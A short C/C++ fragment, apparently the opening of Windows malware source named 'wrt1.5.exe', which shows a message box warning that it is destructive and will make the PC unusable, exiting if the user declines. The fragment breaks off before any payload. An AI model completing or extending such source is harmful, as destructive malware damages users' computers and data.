...
int main()
{
	if (MessageBoxW(NULL, L"THIS IS A DESTRUCTIVE MALWARE! IF YOU WANT TO MAKE YOUR PC UNUSEABLE, PRESS THE YES BUTTON TO START IT!", L"wrt1.5.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
